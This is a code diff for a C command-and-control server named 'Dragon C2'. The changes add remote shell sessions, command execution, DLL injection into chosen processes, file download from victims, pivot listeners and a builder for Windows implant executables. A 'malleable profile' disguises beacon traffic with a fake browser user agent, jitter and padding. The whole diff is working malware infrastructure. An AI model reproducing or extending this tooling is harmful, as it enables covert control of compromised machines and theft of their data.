+                    printf("\n[ACK] Listener '%s' FAILED on %s (port %s, %s)\n",
+                           a_name, pack.target_id, a_port, a_trans);
+                    printf("Dragon: ");
+                    fflush(stdout);
+                }
+                continue;
             } else if (!strcmp(pack.opCode, "0x1A")) {
                 if (decrypt_inner_payload_if_needed(&pack) != 0) continue;
                 uint8_t status = (pack.payload_size >= 1)
@@ -1267,10 +1567,52 @@ void *handle_connection(void *args) {
                 fflush(stdout);
             }
         }
+        next_iter: ;
     }
- 
+    disconnected:
     while (client->in_shell) sleep(1);
+
+    pthread_mutex_lock(&clients_collection_mutex);
+    for (int i = 0; i < MAX_CLIENTS; ++i) {
+        if (clients[i] && clients[i] != client
+            && clients[i]->conn == client->conn) {
+            registry_remove_all_for_client(i);
+            clients[i]->status = "dead";
+            clients[i]->conn = NULL;  // previeni uso della connessione chiusa
+        }
+    }
+    pthread_mutex_unlock(&clients_collection_mutex);
+
     client->trans->close(client->conn);
+    for (int i = 0; i < MAX_CLIENTS; i++) {
+        if (clients[i] == client) {
+            registry_remove_all_for_client(i);
+            break;
+        }
+    }
+    free_remote_listeners(client->remote_listeners);
+    if (client->xfer_dl_fp)
+        fclose(client->xfer_dl_fp);
+
+    pthread_mutex_lock(&clients_collection_mutex);
+    for (int i = 0; i < MAX_CLIENTS; ++i) {
+        if (clients[i] == client) {
+            clients[i] = NULL;
+            break;
+        }
+    }
+    pthread_mutex_unlock(&clients_collection_mutex);
+
+    pthread_mutex_lock(&list_mutex);
+    ListeningSocket *lsc = head_listeners;
+    while (lsc) {
+        if (lsc->client == client)
+            lsc->client = NULL;
+        lsc = lsc->next;
+    }
+    pthread_mutex_unlock(&list_mutex);
+
+    free(client->id);
     free(client);
     ls->occupied = 0;
     return NULL;
@@ -1301,8 +1643,10 @@ static int chunk_and_send(CLIENT *client, const char *buf,
     }
 
     while (len) {
-        uint16_t chunk = (uint16_t)((len > sizeof(pkt.payload))
-                         ? sizeof(pkt.payload) : len);
+        size_t max_clear = (level > 1)
+                     ? sizeof(pkt.payload) - TAG_LEN - CTR_HDR
+                     : sizeof(pkt.payload);
+        uint16_t chunk = (uint16_t)((len > max_clear) ? max_clear : len);
         memcpy(pkt.payload, buf, chunk);
         pkt.payload_size = chunk;
         pkt.target_level = level;
@@ -1310,9 +1654,11 @@ static int chunk_and_send(CLIENT *client, const char *buf,
 
         if (level > 1) {
             uint16_t blob_len = 0;
-            if (dragon_encryption_blob(sub->key_enc, sub->base_iv,
+            uint8_t tmp_chunk[PLAINTEXT_SIZE];
+            memcpy(tmp_chunk, pkt.payload, chunk);
+            if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                         &sub->shell_ctr64_tx,
-                                        (uint8_t*)pkt.payload, chunk,
+                                        tmp_chunk, chunk,
                                         (uint8_t*)pkt.payload,
                                         &blob_len) != 0) {
                 printf("[ERROR] encrypt shell chunk\n");
@@ -1323,8 +1669,8 @@ static int chunk_and_send(CLIENT *client, const char *buf,
 
         pthread_mutex_lock(&client->crypto_mu);
         int sr = send_packet(client->conn, client->trans,
-                         client->key_enc, client->base_iv,
-                         &client->tx_ctr, &pkt);
+                             client->key_tx, client->iv_tx, &client->tx_ctr, client->ck_tx,
+                             &client->tx_epoch, &pkt);
         pthread_mutex_unlock(&client->crypto_mu);
         if (sr != 0) {
             perror("send_packet shell");
@@ -1373,10 +1719,10 @@ void interactive_shell(int port, int level, const char *target_id) {
             client->in_shell = 0;
             return;
         }
-        sub->shell_ctr64_rx = 1;
+        sub->shell_ctr64_rx = 0;
         sub->shell_ctr64_tx = 0;
         uint16_t blob_len = 0;
-        if (dragon_encryption_blob(sub->key_enc, sub->base_iv,
+        if (dragon_encryption_blob(sub->key_tx, sub->iv_tx,
                                     &sub->tx_ctr,
                                     (uint8_t*)start.payload, 0,
                                     (uint8_t*)start.payload,
@@ -1389,8 +1735,8 @@ void interactive_shell(int port, int level, const char *target_id) {
     }
     pthread_mutex_lock(&client->crypto_mu);
     int sr_start = send_packet(ls->client->conn, ls->client->trans,
-                     ls->client->key_enc, ls->client->base_iv,
-                     &ls->client->tx_ctr, &start);
+                             ls->client->key_tx, ls->client->iv_tx, &ls->client->tx_ctr, ls->client->ck_tx,
+                             &ls->client->tx_epoch, &start);
     pthread_mutex_unlock(&client->crypto_mu);
     if (sr_start != 0) {
         perror("send SHELL_START");
@@ -1462,7 +1808,7 @@ cleanup:
         CLIENT *s = return_client_by_id(target_id);
         if (s) {
             uint16_t blob_len = 0;
-            if (dragon_encryption_blob(s->key_enc, s->base_iv,
+            if (dragon_encryption_blob(s->key_tx, s->iv_tx,
                                         &s->tx_ctr,
                                         (uint8_t*)endpkt.payload, 0,
                                         (uint8_t*)endpkt.payload,
@@ -1472,8 +1818,8 @@ cleanup:
     }
     pthread_mutex_lock(&client->crypto_mu);
     send_packet(ls->client->conn, ls->client->trans,
-                ls->client->key_enc, ls->client->base_iv,
-                &ls->client->tx_ctr, &endpkt);
+                             ls->client->key_tx, ls->client->iv_tx, &ls->client->tx_ctr, ls->client->ck_tx,
+                             &ls->client->tx_epoch, &endpkt);
     pthread_mutex_unlock(&client->crypto_mu);
 
     client->in_shell = 0;
@@ -1518,9 +1864,11 @@ void send_dll_to_client(int port, int pid, const char *dll_path,
     strncpy(pkt.target_id, ls->client->id, ID_LEN - 1);
     if (level > 1) {
         uint16_t blob_len;
-        if (dragon_encryption_blob(dst->key_enc, dst->base_iv,
+        uint8_t tmp_pay[PLAINTEXT_SIZE];
+        memcpy(tmp_pay, pkt.payload, pkt.payload_size);
+        if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                     &dst->tx_ctr,
-                                    (uint8_t*)pkt.payload,
+                                    tmp_pay,
                                     pkt.payload_size,
                                     (uint8_t*)pkt.payload,
                                     &blob_len) != 0) {
@@ -1529,8 +1877,8 @@ void send_dll_to_client(int port, int pid, const char *dll_path,
         pkt.payload_size = blob_len;
     }
     if (send_packet(nexthop->conn, nexthop->trans,
-                     nexthop->key_enc, nexthop->base_iv,
-                     &nexthop->tx_ctr, &pkt) != 0) {
+                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
+                             &nexthop->tx_epoch, &pkt) != 0) {
         perror("send 0x07"); return;
     }
 
@@ -1549,14 +1897,16 @@ void send_dll_to_client(int port, int pid, const char *dll_path,
     pkt.payload_size = (uint16_t)strlen(pkt.payload);
     if (level > 1) {
         uint16_t blob_len;
-        dragon_encryption_blob(dst->key_enc, dst->base_iv, &dst->tx_ctr,
-                                (uint8_t*)pkt.payload, pkt.payload_size,
+        uint8_t tmp_buf[PLAINTEXT_SIZE];
+        memcpy(tmp_buf, pkt.payload, pkt.payload_size);
+        dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr,
+                                tmp_buf, pkt.payload_size,
                                 (uint8_t*)pkt.payload, &blob_len);
         pkt.payload_size = blob_len;
     }
     send_packet(nexthop->conn, nexthop->trans,
-                nexthop->key_enc, nexthop->base_iv,
-                &nexthop->tx_ctr, &pkt);
+                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
+                             &nexthop->tx_epoch, &pkt);
 
     size_t sent = 0;
     while (sent < dll_size) {
@@ -1568,16 +1918,18 @@ void send_dll_to_client(int port, int pid, const char *dll_path,
         pkt.payload_size = (uint16_t)chunk;
         if (level > 1) {
             uint16_t blob_len;
-            dragon_encryption_blob(dst->key_enc, dst->base_iv,
+            uint8_t tmp_blob[PLAINTEXT_SIZE];
+            memcpy(tmp_blob, pkt.payload, pkt.payload_size);
+            dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                     &dst->tx_ctr,
-                                    (uint8_t*)pkt.payload,
+                                    tmp_blob,
                                     pkt.payload_size,
                                     (uint8_t*)pkt.payload, &blob_len);
             pkt.payload_size = blob_len;
         }
         if (send_packet(nexthop->conn, nexthop->trans,
-                         nexthop->key_enc, nexthop->base_iv,
-                         &nexthop->tx_ctr, &pkt) != 0) {
+                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
+                             &nexthop->tx_epoch, &pkt) != 0) {
             perror("send 0x09"); break;
         }
         sent += chunk;
@@ -1631,8 +1983,9 @@ void *listener_thread(void *arg) {
         new_client->status     = "active";
         new_client->test       = "NEW";
         new_client->last_beacon= time(NULL);
-        new_client->id         = "\0";
-        new_client->listener_port = ls->port;
+        new_client->id         = NULL;
+        strncpy(new_client->listener_name, ls->name, sizeof(new_client->listener_name) - 1);
+        new_client->listener_name[sizeof(new_client->listener_name) - 1] = '\0';
         new_client->shell_pkt_ready = 0;
         pthread_mutex_init(&new_client->shell_pkt_mu, NULL);
         pthread_cond_init(&new_client->shell_pkt_cond, NULL);
@@ -1669,6 +2022,25 @@ void *listener_thread(void *arg) {
     return NULL;
 }
 
+static void profile_set_defaults(malleable_profile_t *p)
+{
+    memset(p, 0, sizeof(*p));
+    p->beacon_interval_s = 20;
+    p->jitter_pct = 20;
+    p->reconnect_delay_ms = 5000;
+    p->dns_poll_ms = 3000;
+    strncpy(p->http_user_agent,
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36",
+            MP_USER_AGENT_MAX - 1);
+    strncpy(p->http_content_type, "application/octet-stream",
+            MP_CONTENT_TYPE_MAX - 1);
+    strncpy(p->http_path_data, "/c2", MP_PATH_MAX - 1);
+    strncpy(p->http_path_hs, "/c2/hs", MP_PATH_MAX - 1);
+    strncpy(p->smb_pipe_name, "dragon_pipe", MP_PIPE_NAME_MAX - 1);
+}
+
 /* =========================================================================
  * start / stop / list listeners
  * ====================================================================== */
@@ -1679,7 +2051,11 @@ void *listener_thread(void *arg) {
  * Creates a listener on the given port and protocol.
  * Spawns listener_thread. Returns 0 on success, -1 on failure.
  * ====================================================================== */
-int start_listen_on_port(const char *proto, int port) {
+int start_listen_on_port(const char *name, const char *proto, int port, const malleable_profile_t *prof) {
+    if (registry_name_exists(name)) {
+        printf("[!] Listener name \"%s\" already exists\n", name);
+        return -1;
+    }
     transport_t *trans = transport_get(proto);
     if (!trans) {
         fprintf(stderr, "Unknown transport: %s\n", proto);
@@ -1700,10 +2076,16 @@ int start_listen_on_port(const char *proto, int port) {
     ls->trans    = trans;
     ls->handle   = handle;
     ls->port     = port;
+    snprintf(ls->name, sizeof(ls->name), "%s", name);
     ls->active   = 1;
     ls->occupied = 0;
     ls->next     = NULL;
     ls->client   = NULL;
+
+    if (prof)
+        memcpy(&ls->profile, prof, sizeof ls->profile);
+    else
+        profile_set_defaults(&ls->profile);
 
     if (pthread_create(&ls->thread, NULL, listener_thread, ls) != 0) {
         perror("pthread_create");
@@ -1719,6 +2101,7 @@ int start_listen_on_port(const char *proto, int port) {
     pthread_mutex_unlock(&list_mutex);
 
     printf("Started listening on port %d using %s\n", port, trans->name);
+    registry_add_listener(name, port, proto, -1, prof);
     return 0;
 }
 
@@ -1728,25 +2111,26 @@ int start_listen_on_port(const char *proto, int port) {
  * Stops the listener on the given port. Closes the socket and removes
  * it from the list.
  * ====================================================================== */
-int stop_listen_on_port(int port) {
+int stop_listen_on_port(const char *name) {
     pthread_mutex_lock(&list_mutex);
     ListeningSocket **curr = &head_listeners;
     while (*curr) {
         ListeningSocket *ls = *curr;
-        if (ls->port == port) {
+        if (strcmp(ls->name, name) == 0) {
             ls->active = 0;
             if (ls->trans && ls->trans->close_listener)
                 ls->trans->close_listener(ls->handle);
             *curr = ls->next;
             free(ls);
-            printf("Stopped listening on port %d\n", port);
+            printf("Stopped listener \"%s\" (port %d)\n", ls->name, ls->port);
             pthread_mutex_unlock(&list_mutex);
+            registry_remove_listener(name);
             return 0;
         }
         curr = &(*curr)->next;
     }
     pthread_mutex_unlock(&list_mutex);
-    printf("No listener on port %d\n", port);
+    printf("No listener named \"%s\"\n", name);
     return -1;
 }
 
@@ -1804,16 +2188,22 @@ void send_command_to_client(int port, int level,
             memset(&packet, 0, sizeof packet);
             snprintf(packet.opCode, sizeof packet.opCode,
                      "0x%02X", OPCODE_EXEC_CMD);
-            strncpy(packet.payload, cmd, sizeof packet.payload - 1);
+            size_t max_cmd = (level > 1)
+               ? sizeof(packet.payload) - TAG_LEN - 1
+               : sizeof(packet.payload) - 1;
+            strncpy(packet.payload, cmd, max_cmd);
+            packet.payload[max_cmd] = '\0';
             packet.payload_size = (uint16_t)strlen(packet.payload);
             packet.target_level = level;
             strncpy(packet.target_id, target_id, ID_LEN - 1);
 
             if (level > 1) {
                 uint16_t blob_len = 0;
-                if (dragon_encryption_blob(dst->key_enc, dst->base_iv,
+                uint8_t tmp_cmd[PLAINTEXT_SIZE];
+                memcpy(tmp_cmd, packet.payload, packet.payload_size);
+                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                             &dst->tx_ctr,
-                                            (uint8_t*)packet.payload,
+                                            tmp_cmd,
                                             packet.payload_size,
                                             (uint8_t*)packet.payload,
                                             &blob_len) != 0) {
@@ -1824,8 +2214,8 @@ void send_command_to_client(int port, int level,
                 packet.payload_size = blob_len;
             }
             if (send_packet(nexthop->conn, nexthop->trans,
-                             nexthop->key_enc, nexthop->base_iv,
-                             &nexthop->tx_ctr, &packet) == 0)
+                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
+                             &nexthop->tx_epoch, &packet) == 0)
                 printf("[COMMAND] Sent to %s (level %d)\n",
                        target_id, level);
             else
@@ -1846,7 +2236,12 @@ void send_command_to_client(int port, int level,
 void send_start_listener_to_client(int port, int level,
                                     const char *target_id,
                                     int listener_port,
-                                    const char *transport_type) {
+                                    const char *transport_type,
+                                    const char *listener_name) {
+    if (registry_name_exists(listener_name)) {
+        printf("[!] Listener name \"%s\" already exists\n", listener_name);
+        return;
+    }
     pthread_mutex_lock(&list_mutex);
     ListeningSocket *curr = head_listeners;
     while (curr) {
@@ -1864,24 +2259,28 @@ void send_start_listener_to_client(int port, int level,
             snprintf(pkt.opCode, sizeof pkt.opCode, "0x0B");
             pkt.target_level = level;
             strncpy(pkt.target_id, target_id, ID_LEN - 1);
-            snprintf(pkt.payload, sizeof pkt.payload,
-                     "%s %d", transport_type, listener_port);
-            pkt.payload_size = (uint16_t)strlen(pkt.payload);
+            int text_len = snprintf(pkt.payload, sizeof pkt.payload, "%s %d %s", transport_type, listener_port, listener_name);
+            text_len += 1;
+            uint16_t prof_len = 0;
+            profile_serialize(&g_profile, (uint8_t *)pkt.payload + text_len, &prof_len);
+            pkt.payload_size = (uint16_t)(text_len + prof_len);
             if (level > 1) {
                 uint16_t blob_len = 0;
-                dragon_encryption_blob(dst->key_enc, dst->base_iv,
+                uint8_t tmp_sl[PLAINTEXT_SIZE];
+                memcpy(tmp_sl, pkt.payload, pkt.payload_size);
+                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                         &dst->tx_ctr,
-                                        (uint8_t*)pkt.payload,
+                                        tmp_sl,
                                         pkt.payload_size,
-                                        (uint8_t*)pkt.payload, &blob_len);
+                                        (uint8_t*)pkt.payload, &blob_len) != 0) {
+                    pthread_mutex_unlock(&list_mutex);
+                    return;
+                }
                 pkt.payload_size = blob_len;
             }
-            if (send_packet(nexthop->conn, nexthop->trans,
-                             nexthop->key_enc, nexthop->base_iv,
-                             &nexthop->tx_ctr, &pkt) == 0)
-                printf("[INFO] Start listener port %d (%s) -> %s\n",
-                       listener_port, transport_type, target_id);
-            else
+            if (send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &pkt) == 0) {
+                printf("[INFO] 0x0B sent -> %s (name=%s), waiting for ACK\n", target_id, listener_name);
+            } else
                 printf("[ERROR] Failed start listener -> %s\n", target_id);
             break;
         }
@@ -1897,7 +2296,7 @@ void send_start_listener_to_client(int port, int level,
  * ====================================================================== */
 void send_stop_listener_to_client(int port, int level,
                                    const char *target_id,
-                                   int listener_port) {
+                                   const char *listener_name) {
     pthread_mutex_lock(&list_mutex);
     ListeningSocket *curr = head_listeners;
     while (curr) {
@@ -1915,24 +2314,39 @@ void send_stop_listener_to_client(int port, int level,
             snprintf(pkt.opCode, sizeof pkt.opCode, "0x0C");
             pkt.target_level = level;
             strncpy(pkt.target_id, target_id, ID_LEN - 1);
-            snprintf(pkt.payload, sizeof pkt.payload,
-                     "%d", listener_port);
+            snprintf(pkt.payload, sizeof pkt.payload - TAG_LEN,
+                     "%s", listener_name);
             pkt.payload_size = (uint16_t)strlen(pkt.payload);
             if (level > 1) {
                 uint16_t blob_len = 0;
-                dragon_encryption_blob(dst->key_enc, dst->base_iv,
+                uint8_t tmp_stl[PLAINTEXT_SIZE];
+                memcpy(tmp_stl, pkt.payload, pkt.payload_size);
+                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                         &dst->tx_ctr,
-                                        (uint8_t*)pkt.payload,
+                                        tmp_stl,
                                         pkt.payload_size,
-                                        (uint8_t*)pkt.payload, &blob_len);
+                                        (uint8_t*)pkt.payload, &blob_len) != 0) {
+                    pthread_mutex_unlock(&list_mutex);
+                    return;
+                }
                 pkt.payload_size = blob_len;
             }
-            if (send_packet(nexthop->conn, nexthop->trans,
-                             nexthop->key_enc, nexthop->base_iv,
-                             &nexthop->tx_ctr, &pkt) == 0)
-                printf("[INFO] Stop listener port %d -> %s\n",
-                       listener_port, target_id);
-            else
+            if (send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &pkt) == 0) {
+                printf("[INFO] Stop listener \"%s\" -> %s\n",
+                       listener_name, target_id);
+                CLIENT *target = (level > 1 && dst) ? dst : nexthop;
+                RemoteListener **pp = &target->remote_listeners;
+                while (*pp) {
+                    if (strcmp((*pp)->name, listener_name) == 0) {
+                        RemoteListener *dead = *pp;
+                        *pp = dead->next;
+                        free(dead);
+                        break;
+                    }
+                    pp = &(*pp)->next;
+                }
+                registry_remove_listener(listener_name);
+            } else
                 printf("[ERROR] Failed stop listener -> %s\n", target_id);
             break;
         }
@@ -1954,19 +2368,24 @@ static int file_send_packet(CLIENT *nexthop, CLIENT *dst, int level, const char 
     strcpy(p.opCode, opcode);
     p.target_level = level;
     strncpy(p.target_id, target_id, ID_LEN - 1);
-    if(payload_len > sizeof(p.payload)) {
+    size_t max_clear = (level > 1 && dst)
+                 ? sizeof(p.payload) - TAG_LEN - CTR_HDR
+                 : sizeof(p.payload);
+    if(payload_len > max_clear) {
         return -1;
     }
     memcpy(p.payload, payload_data, payload_len);
     p.payload_size = (uint16_t)payload_len;
     if(level > 1 && dst) {
         uint16_t bl = 0;
-        if(dragon_encryption_blob(dst->key_enc, dst->base_iv, &dst->tx_ctr, (uint8_t*)p.payload, p.payload_size, (uint8_t*)p.payload, &bl) != 0) {
+        uint8_t tmp_fsp[PLAINTEXT_SIZE];
+        memcpy(tmp_fsp, p.payload, p.payload_size);
+        if(dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr, tmp_fsp, p.payload_size, (uint8_t*)p.payload, &bl) != 0) {
             return -1;
         }
         p.payload_size = bl;
     }
-    return send_packet(nexthop->conn, nexthop->trans, nexthop->key_enc, nexthop->base_iv, &nexthop->tx_ctr, &p);
+    return send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &p);
 }
 
 /* =========================================================================
@@ -2092,12 +2511,18 @@ void send_file_download_request(int port, int level, const char *target_id, cons
     strcpy(pkt.opCode, "0x14");
     pkt.target_level = level;
     strncpy(pkt.target_id, target_id, ID_LEN - 1);
-    strncpy(pkt.payload, remote_path, sizeof(pkt.payload) - 1);
+    size_t max_path = (level > 1 && dst)
+                ? sizeof(pkt.payload) - TAG_LEN - 1
+                : sizeof(pkt.payload) - 1;
+    strncpy(pkt.payload, remote_path, max_path);
+    pkt.payload[max_path] = '\0';
     pkt.payload_size = (uint16_t)strlen(pkt.payload);
 
     if (level > 1 && dst) {
         uint16_t bl = 0;
-        if (dragon_encryption_blob(dst->key_enc, dst->base_iv, &dst->tx_ctr, (uint8_t*)pkt.payload, pkt.payload_size, (uint8_t*)pkt.payload, &bl) != 0) {
+        uint8_t tmp_dl[PLAINTEXT_SIZE];
+        memcpy(tmp_dl, pkt.payload, pkt.payload_size);
+        if (dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr, tmp_dl, pkt.payload_size, (uint8_t*)pkt.payload, &bl) != 0) {
             printf("[ERROR] Encrypt 0x14 start download failed\n");
             fclose(target->xfer_dl_fp);
             target->xfer_dl_fp = NULL;
@@ -2106,7 +2531,9 @@ void send_file_download_request(int port, int level, const char *target_id, cons
         }
         pkt.payload_size = bl;
     }
-    if (send_packet(nexthop->conn, nexthop->trans, nexthop->key_enc, nexthop->base_iv, &nexthop->tx_ctr, &pkt) == 0) {
+    if (send_packet(nexthop->conn, nexthop->trans,
+                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
+                             &nexthop->tx_epoch, &pkt) == 0) {
         printf("[DOWNLOAD] Request sent: %s -> %s\n", remote_path, local_path);
     } else {
         printf("[ERROR] Sending download request 0x14 failed\n");
@@ -2250,6 +2677,151 @@ void load_server_key(void) {
 }
 
 /* =========================================================================
+ * File-based Malleable Profile
+ *
+ * Loads/saves a malleable_profile_t from/to a text file (profile.conf).
+ * Format: key = value, one per line. Lines starting with # are comments.
+ * Used by the 'generate' command to avoid hardcoded profile values.
+ * ====================================================================== */
+
+#define PROFILE_CONF_PATH "profile.conf"
+
+static int g_profile_loaded = 0;
+
+static void str_trim(char *s)
+{
+    char *end = s + strlen(s) - 1;
+    while (end >= s && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r'))
+        *end-- = '\0';
+    char *start = s;
+    while (*start == ' ' || *start == '\t')
+        start++;
+    if (start != s)
+        memmove(s, start, strlen(start) + 1);
+}
+
+static int profile_load_from_file(const char *path, malleable_profile_t *p)
+{
+    profile_set_defaults(p);
+
+    FILE *f = fopen(path, "r");
+    if (!f)
+        return -1;
+
+    char line[1024];
+    int count = 0;
+
+    while (fgets(line, sizeof(line), f)) {
+        str_trim(line);
+        if (line[0] == '#' || line[0] == '\0')
+            continue;
+
+        char *eq = strchr(line, '=');
+        if (!eq)
+            continue;
+
+        *eq = '\0';
+        char *key = line;
+        char *val = eq + 1;
+        str_trim(key);
+        str_trim(val);
+
+        if (strcmp(key, "beacon_interval_s") == 0)
+            p->beacon_interval_s = (uint16_t)atoi(val);
+        else if (strcmp(key, "jitter_pct") == 0)
+            p->jitter_pct = (uint8_t)atoi(val);
+        else if (strcmp(key, "reconnect_delay_ms") == 0)
+            p->reconnect_delay_ms = (uint16_t)atoi(val);
+        else if (strcmp(key, "http_user_agent") == 0)
+            strncpy(p->http_user_agent, val, MP_USER_AGENT_MAX - 1);
+        else if (strcmp(key, "http_content_type") == 0)
+            strncpy(p->http_content_type, val, MP_CONTENT_TYPE_MAX - 1);
+        else if (strcmp(key, "http_path_data") == 0)
+            strncpy(p->http_path_data, val, MP_PATH_MAX - 1);
+        else if (strcmp(key, "http_path_hs") == 0)
+            strncpy(p->http_path_hs, val, MP_PATH_MAX - 1);
+        else if (strcmp(key, "http_extra_headers") == 0)
+            strncpy(p->http_extra_headers, val, MP_EXTRA_HEADERS_MAX - 1);
+        else if (strcmp(key, "smb_pipe_name") == 0)
+            strncpy(p->smb_pipe_name, val, MP_PIPE_NAME_MAX - 1);
+        else if (strcmp(key, "dns_domain") == 0)
+            strncpy(p->dns_domain, val, MP_DNS_DOMAIN_MAX - 1);
+        else if (strcmp(key, "dns_poll_ms") == 0)
+            p->dns_poll_ms = (uint16_t)atoi(val);
+        else if (strcmp(key, "pkt_pad_min") == 0)
+            p->pkt_pad_min = (uint16_t)atoi(val);
+        else if (strcmp(key, "pkt_pad_max") == 0)
+            p->pkt_pad_max = (uint16_t)atoi(val);
+        else
+            printf("[PROFILE] unknown key: '%s'\n", key);
+
+        count++;
+    }
+
+    fclose(f);
+    printf("[PROFILE] loaded %d settings from %s\n", count, path);
+    return 0;
+}
+
+static void profile_reload(void)
+{
+    if (profile_load_from_file(PROFILE_CONF_PATH, &g_profile) == 0)
+        g_profile_loaded = 1;
+    else
+        printf("[PROFILE] %s not found, using defaults\n", PROFILE_CONF_PATH);
+}
+
+static int profile_save_default(const char *path)
+{
+    FILE *f = fopen(path, "r");
+    if (f) {
+        fclose(f);
+        return 0;
+    }
+
+    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0666);
+    if (fd < 0) return -1;
+    f = fdopen(fd, "w");
+    if (!f) {
+        printf("[PROFILE] cannot create %s\n", path);
+        return -1;
+    }
+
+    fprintf(f,
+        "# Dragon C2 - Malleable Profile Configuration\n"
+        "# Edit before running 'generate'. Future GUI will use this file.\n"
+        "#\n"
+        "# Lines starting with # are comments.\n"
+        "# Format: key = value\n"
+        "\n"
+        "# -- Beacon behavior --\n"
+        "beacon_interval_s = 20\n"
+        "jitter_pct = 20\n"
+        "reconnect_delay_ms = 5000\n"
+        "\n"
+        "# -- HTTP / HTTPS --\n"
+        "http_user_agent = Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/120.0.0.0 Safari/537.36\n"
+        "http_content_type = application/octet-stream\n"
+        "http_path_data = /c2\n"
+        "http_path_hs = /c2/hs\n"
+        "http_extra_headers = \n"
+        "\n"
+        "# -- SMB --\n"
+        "smb_pipe_name = dragon_pipe\n"
+        "\n"
+        "# -- DNS --\n"
+        "dns_domain = \n"
+        "dns_poll_ms = 3000\n"
+    );
+
+    fclose(f);
+    printf("[PROFILE] created default %s\n", path);
+    return 0;
+}
+
+/* =========================================================================
  * generate_client
  *
  * Cross-compiles a Windows client from the server using CMake and
@@ -2262,7 +2834,10 @@ void load_server_key(void) {
 #define CLIENT_SRC_DIR  "./client"
 #define OUTPUT_DIR      "./output"
 
-static void generate_client(const char *transport, int level, const char *host, int port, const char *father_ip, int father_port, int beacon_interval) {
+static void generate_client(const char *transport, int level, const char *host, int port,
+                            const char *father_ip, int father_port,
+                            const char *listener_name,
+                            const malleable_profile_t *profile) {
     FILE *f = fopen("server_pub.h", "r");
     if (!f) {
         printf("[ERROR] server_pub.h not found - run keygen first\n");
@@ -2286,6 +2861,7 @@ static void generate_client(const char *transport, int level, const char *host, 
     }
 
     char cmd[4096];
+
     snprintf(cmd, sizeof cmd,
         "cmake -S %s -B %s/build "
         "-DCMAKE_TOOLCHAIN_FILE=%s/cmake/mingw-w64-toolchain.cmake "
@@ -2294,17 +2870,45 @@ static void generate_client(const char *transport, int level, const char *host, 
         "-DSERVER_PORT=%d "
         "-DFATHER_IP=%s "
         "-DFATHER_PORT=%d "
+        "-DFATHER_LISTENER_NAME=\\\"%s\\\" "
         "-DUPSTREAM_TRANSPORT=%s "
         "-DBEACON_INTERVAL=%d "
+        "-DDNS_DOMAIN=%s "
+        "-DDNS_POLL_MS=%d "
+        "-DJITTER_PCT=%d "
+        "-DRECONNECT_DELAY_MS=%d "
+        "-DHTTP_USER_AGENT=\"%s\" "
+        "-DHTTP_CONTENT_TYPE=\"%s\" "
+        "-DHTTP_PATH_DATA=\"%s\" "
+        "-DHTTP_PATH_HS=\"%s\" "
+        "-DHTTP_EXTRA_HEADERS=\"%s\" "
+        "-DSMB_PIPE_NAME=\"%s\" "
+        "-DFATHER_LISTENER_NAME=\"%s\" "
         "&& cmake --build %s/build 2>&1",
         CLIENT_SRC_DIR, OUTPUT_DIR,
         cwd,
-        level, host, port, father_ip, father_port,
-        transport, beacon_interval,
+        level, host, port, father_ip, father_port, listener_name,
+        transport,
+        profile->beacon_interval_s,
+        profile->dns_domain,
+        profile->dns_poll_ms,
+        profile->jitter_pct,
+        profile->reconnect_delay_ms,
+        profile->http_user_agent,
+        profile->http_content_type,
+        profile->http_path_data,
+        profile->http_path_hs,
+        profile->http_extra_headers,
+        profile->smb_pipe_name,
+        listener_name,
         OUTPUT_DIR);
 
-    printf("[GENERATE] Building client (level=%d, %s, %s:%d, beacon=%ds)\n",
-           level, transport, host, port, beacon_interval);
+    if (strcmp(transport, "dns") == 0)
+        printf("[GENERATE] Building client (level=%d, %s, domain=%s, resolver=%s:%d, beacon=%ds)\n",
+            level, transport, profile->dns_domain, host, port, profile->beacon_interval_s);
+    else
+        printf("[GENERATE] Building client (level=%d, %s, %s:%d, beacon=%ds)\n",
+            level, transport, host, port, profile->beacon_interval_s);
     fflush(stdout);
 
     FILE *proc = popen(cmd, "r");
@@ -2320,9 +2924,14 @@ static void generate_client(const char *transport, int level, const char *host, 
     int status = pclose(proc);
     if (status == 0) {
         char final_name[512];
-        snprintf(final_name, sizeof final_name,
-                 "%s/client_L%d_%s_%s_%d.exe",
-                 OUTPUT_DIR, level, transport, host, port);
+        if (strcmp(transport, "smb") == 0)
+            snprintf(final_name, sizeof final_name,
+                     "%s/client_L%d_%s_%s_%s.exe",
+                     OUTPUT_DIR, level, transport, host, profile->smb_pipe_name);
+        else
+            snprintf(final_name, sizeof final_name,
+                     "%s/client_L%d_%s_%s_%d.exe",
+                     OUTPUT_DIR, level, transport, host, port);
         char mv_cmd[1024];
         snprintf(mv_cmd, sizeof mv_cmd,
                  "cp %s/build/client.exe %s", OUTPUT_DIR, final_name);
@@ -2340,21 +2949,27 @@ static void generate_client(const char *transport, int level, const char *host, 
  * ====================================================================== */
 void print_help_commands() {
     printf("Commands:\n");
